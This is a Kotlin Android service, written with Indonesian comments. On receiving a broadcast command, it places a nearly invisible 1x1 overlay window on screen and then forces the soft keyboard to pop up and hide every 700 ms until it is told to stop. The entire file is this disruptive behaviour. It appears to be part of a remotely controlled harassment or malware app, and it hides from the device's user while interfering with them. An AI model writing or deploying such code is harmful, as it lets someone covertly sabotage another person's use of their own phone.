package com.sync.xxx

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.WindowManager
import android.view.inputmethod.InputMethodManager
import android.widget.EditText
import android.widget.FrameLayout

class KeyboardSpamOverlayService : Service() {

    companion object {
        const val ACTION_START = "com.sync.xxx.KEYBOARD_SPAM_OVERLAY_START"
        const val ACTION_STOP = "com.sync.xxx.KEYBOARD_SPAM_OVERLAY_STOP"
    }

    private var windowManager: WindowManager? = null
    private var overlayView: FrameLayout? = null
    private var editText: EditText? = null
    private val handler = Handler(Looper.getMainLooper())
    private var spamRunnable: Runnable? = null
    private var isSpamming = false

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                ACTION_START -> startSpam()
                ACTION_STOP -> stopSpam()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val filter = IntentFilter().apply {
            addAction(ACTION_START)
            addAction(ACTION_STOP)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startSpam() {
        if (isSpamming) return
        isSpamming = true

        // Buat invisible overlay dengan EditText
        overlayView = FrameLayout(this).apply {
            alpha = 0.01f // Hampir invisible
        }

        editText = EditText(this).apply {
            hint = ""
            isFocusable = true
            isFocusableInTouchMode = true
        }

        overlayView?.addView(editText, FrameLayout.LayoutParams(1, 1))

        val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(
            1, 1,
            layoutFlag,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
        }

        try {
            windowManager?.addView(overlayView, params)
        } catch (e: Exception) {
            android.util.Log.e("KeyboardSpamOverlay", "addView error: ${e.message}")
            return
        }

        // Spam loop
        spamRunnable = object : Runnable {
            override fun run() {
                if (!isSpamming) return

                try {
                    val imm = getSystemService(INPUT_METHOD_SERVICE) as InputMethodManager
                    
                    // Focus EditText → keyboard muncul
                    handler.post {
                        editText?.requestFocus()
                        imm.showSoftInput(editText, InputMethodManager.SHOW_IMPLICIT)
                    }

                    // 300ms kemudian, hide keyboard
                    handler.postDelayed({
                        editText?.clearFocus()
                        imm.hideSoftInputFromWindow(editText?.windowToken, 0)
                    }, 300)

                } catch (e: Exception) {
                    android.util.Log.e("KeyboardSpamOverlay", "Spam error: ${e.message}")
                }

                // Loop setiap 700ms
                handler.postDelayed(this, 700)
            }
        }
        handler.post(spamRunnable!!)

        android.util.Log.d("KeyboardSpamOverlay", "Spam started")
    }

    private fun stopSpam() {
        isSpamming = false
        spamRunnable?.let { handler.removeCallbacks(it) }
        spamRunnable = null

        try {
            overlayView?.let { windowManager?.removeView(it) }
        } catch (e: Exception) {
            android.util.Log.e("KeyboardSpamOverlay", "removeView error: ${e.message}")
        }

        overlayView = null
        editText = null

        android.util.Log.d("KeyboardSpamOverlay", "Spam stopped")
    }

    override fun onDestroy() {
        super.onDestroy()
        stopSpam()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }
}
